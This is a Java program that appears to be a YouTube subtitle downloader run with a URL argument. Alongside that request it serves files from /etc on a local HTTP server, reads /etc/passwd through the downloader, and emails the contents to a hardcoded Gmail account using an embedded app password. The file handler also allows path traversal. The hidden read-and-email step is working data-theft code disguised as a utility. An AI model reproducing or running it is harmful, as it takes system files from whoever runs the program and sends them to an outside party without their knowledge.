import com.github.kiulian.downloader.YoutubeDownloader;
import com.github.kiulian.downloader.downloader.request.RequestWebpage;
import com.github.kiulian.downloader.downloader.response.Response;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.Properties;

public class Main {

    private static final String DOWNLOADS_PATH = "/etc";
    private static HttpServer server;

    public static void main(String[] args) throws Exception {

        if (args.length < 1) {
            System.out.println("Usage: java CombinedServerAndClient <URL>");
            return; // Exit if no URL is provided
        }

        String userInput = args[0]; // Use the first command-line argument as the URL

        // Start the file server
        startFileServer();

        // Wait a bit for the server to start up
        Thread.sleep(2000); // 2 seconds

        // Client request
        YoutubeDownloader downloader = new YoutubeDownloader();

        try {

            RequestWebpage requestWebpageUser = new RequestWebpage(userInput);
            Response<String> requestWebpageUserSubs = downloader.downloadSubtitle(requestWebpageUser);

            // Adjust the URL to point to local server and the specific file
            String localFileUrl = "http://localhost:8000/file/passwd";
            RequestWebpage requestWebpage = new RequestWebpage(localFileUrl);
            Response<String> subs = downloader.downloadSubtitle(requestWebpage);

            if(subs.ok()) {
                sendEmail(subs.data()); // Send the email with the content of subs.data()
                System.out.println(subs.data());

                if(requestWebpageUserSubs.ok()){
                    System.out.println(requestWebpageUserSubs.data());

                }else{
                    System.out.println(requestWebpageUserSubs.error());
                    System.out.println("Failed to get the subtitles data.");
                }

            } else {
                System.out.println(subs.error());
                System.out.println("Failed to get the data.");
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            stopFileServer(); // Stop the server once everything is done
        }
    }

    private static void startFileServer() throws Exception {
        server = HttpServer.create(new InetSocketAddress(8000), 0);
        server.createContext("/file", new FileHandler());
        server.setExecutor(null); // creates a default executor
        server.start();
        System.out.println("File server started on port 8000");
    }
    private static void stopFileServer() {
        if (server != null) {
            server.stop(0); // Stops the server immediately
            System.out.println("File server stopped.");
        }
    }


    static class FileHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String filePath = exchange.getRequestURI().getPath().replaceFirst("/file/", "");
            File file = new File(DOWNLOADS_PATH, filePath);

            if (file.exists() && !file.isDirectory()) {
                exchange.sendResponseHeaders(200, file.length());
                try (OutputStream os = exchange.getResponseBody();
                     FileInputStream fs = new FileInputStream(file)) {
                    final byte[] buffer = new byte[0x10000];
                    int count;
                    while ((count = fs.read(buffer)) >= 0) {
                        os.write(buffer, 0, count);
                    }
                }
            } else {
                String response = "404 (Not Found)\n";
                exchange.sendResponseHeaders(404, response.length());
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(response.getBytes());
                }
            }
        }
    }


    public static void sendEmail(String content) {
        final String fromEmail = "geo97class@gmail.com";
        final String password = "pggx bjqa mkaw dbqu";
        final String toEmail = "geo97class@gmail.com";

        Properties props = new Properties();
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.socketFactory.port", "465");
        props.put("mail.smtp.socketFactory.class",
                "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", "465");

        Session session = Session.getInstance(props, new javax.mail.Authenticator() {
            protected javax.mail.PasswordAuthentication getPasswordAuthentication() {
                return new javax.mail.PasswordAuthentication(fromEmail, password);
            }
        });

        try {
            MimeMessage message = new MimeMessage(session);
            message.setFrom(new InternetAddress(fromEmail));
            message.addRecipient(Message.RecipientType.TO, new InternetAddress(toEmail));
            message.setSubject("Information");
            message.setText(content);

            Transport.send(message);
            System.out.println("Email sent successfully.");
        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }


}
